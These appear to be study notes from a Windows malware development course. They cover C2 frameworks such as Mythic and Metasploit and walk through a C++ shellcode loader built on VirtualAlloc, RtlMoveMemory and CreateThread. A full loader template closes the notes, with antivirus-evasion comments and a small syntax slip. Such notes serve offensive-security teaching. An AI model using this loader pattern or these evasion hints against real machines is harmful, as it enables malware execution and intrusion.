-----
description: Notes from Dahvid Schloss's Course
-----

# Windows Malware Development

This course aims to outline the basics of Malware Development for Windows.
C2 frameworks are covered as well as writing shellcode in Cpp.

## C2 Review
There are two major categories of C2: Synchronous and Asynchronous.

SynC2 are continuous connections. Metasploit is a SynC2, and so is SSH.
AsynC2s are the more common ones that use sleep timers. This makes it
easier to hide traffic and forces the target to rely on behavioral detections.

Using `run -j` sets a given task to run automatically as a job in Metasploit.

### Mythic C2
C2 where the community writes agents in any language. Used in the course.

* C2: `https://github.com/its-a-feature/Mythic`
* Agents: `https://github.com/MythicAgents/Athena`

Starting mythic is as simple as `./mythic-cli start`. You log in at 
https://127.0.0.1:8443 and the default password is generated and put
in the `.env` file within the mythic folder.

According to their [github.io](https://mythicmeta.github.io/overview/) it looks
like only a couple agents are still being worked on reliably.

## Building Shellcode Loaders
It's important to know that regular programs and malware operate the same way.
They both need three things:

1. A place to put their code
2. A way to execute their code
3. A way to keep executing their code

There are many ways to do this on windows, which is why the Win32 API documenation
is incredibly useful. You can read it [here](https://docs.microsoft.com/en-us/windows/win32/api).
An important section to notice is the (memory protection constants)
[https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants].
Due to the vastness of this documentation, there will almost always be another way to accomplish
these 3 objectives aside from the basic pathway covered in this course.

### A Place
A place to put shellcode can be accomplished by using `VirualAlloc`, a memory allocation function
in the Win32 API. This is an allocation function that will give us the memory we need. The schema
is below:

```c++
LPVOID VirtualAlloc(
    [in, optional]  LPVOID lpAddress,
    [in]            SIZE_T dwSize,
    [in]            DWORD flAllocationType,
    [in]            DWORD flProtect
);
```

As we can see, the function needs 4 things, given from top to bottom:

1. A Pointer Address for the memory
2. The size of the data that we need to add to memory
3. An allocation type (committing, reserving)
4. What memory protections we want (if any)

The following is an example of what this would look like:

`VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, 0x40);`

Where `0` is the first available area, `payload_len` is a var equal to the size of the code,
`MEM_COMMIT | MEM_RESERVE` is the instruction to both reserve and commit the memory, and
`0x40` is the dword that sets the `rwx` permissions to the buffer.

#### Moving to the Buffer
This is a subrequisite of reserving a space in the buffer. You have to be able to move the shellcode
to the space you've just reserved. This can be done with `RtlMoveMemory`:

```c++
VOID RtlMoveMemory(
    _Out_   VOID UNALIGNED *Destination,
    _In_    VOID UNALIGNED *Source,
    _In_    SIZE_T          Length
);
```

The elements are the destination, the shellcode (Source) and the length to copy. This does mean
that you can copy over only partial bits of the shellcode if you want to try to obfuscate it some way.

The following is an example of what this would look like:

`RtlMoveMemory(allocated_mem, payload, payload_length)`

Where `allocated_mem` is the pointer address of our `VirtualAlloc` chunk, `payload` is the unsigned character
array of our payload (msfvenom output) and `length` is an int.


### Executing
Exeuction can be handled with `CreateThread`, which will do exactly that:

`CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload, 0, 0, 0);`

Where the first 0 is security attributes, the second 0 sets the defualt stack size,
the third argument is the thread start routine we want to use, and the last three 
options control tying another thread in, start time delay and thread identification.

### Keeping it Alive
There are a lot of ways to do this. We will use `WaitForSingleObject` here.

```c++
DWORD WaitForSingleObject(
    [in] HANDLE hHandle,
    [in] DWORD  dwMilliseconds
);
```

Where `hHandle` is the handle to watch and `dwMilliseconds` is the time limit before the process
is killed. This can be set to infinity, however. We can do this in a number of ways, but 
`WaitForSingleObject(thread, -1);` is easy enough.

## First Malware
This section is separate simply for ease of access. Following this paragraph will be a simple shellcode
loader and a description of what it does:

```c++
#include <iostream>
#include <Windows.h>

int main()
{
    void* execute; //instantiate void pointer for execute (initialize empty variable)
    HANDLE thread; //instantiate handle with name thread
    unsigned char buf[] =
        "Shellcode";    // Drop shellcode into script.
        // It's important to note that most AV will capture a loader if the shellcode is 
        // right at the top because that's how a lot of malware tutorials handle the 
        // positioning of shellcode.
    unsigned int buf_len = sizeof(buf); // Gather shellcode size for use later
    execute = VirtualAlloc(0, buf_len, MEM_COMMIT | MEM_RESERVE, 0x40); // 0x40 isn't the best DWORD for this
                                                                        // More restrictive is stealthier
    RtlMoveMemory(execute, buf, buf_len) // Bring shellcode to the buffer
    thread =  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)execute, 0, 0, 0); // execute
    WaitForSingleObject(thread, -1); // Hodor.
}
```

